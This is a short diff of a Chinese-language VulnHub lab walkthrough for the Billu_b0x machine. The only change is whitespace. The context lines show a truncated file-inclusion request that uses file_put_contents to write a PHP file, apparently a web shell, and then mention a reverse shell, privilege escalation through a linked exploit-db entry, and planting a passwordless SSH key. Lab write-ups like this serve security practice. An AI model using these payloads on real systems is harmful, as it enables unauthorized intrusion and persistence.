@@ -66,7 +66,7 @@ continue=&load=uploaded_images/trial.png&trial=file_put_contents('test.php','<?p
 ![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_7.png)    
 反弹shell     
 ![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_8.png)    
-提权
+提权    
 ![image](https://raw.githubusercontent.com/trialv/vulnhub_test/master/Billu_b0x/png_9.png)    
 [https://www.exploit-db.com/exploits/37292/](https://www.exploit-db.com/exploits/37292/)     
 写入免密密匙  然后。。久就没有然后了
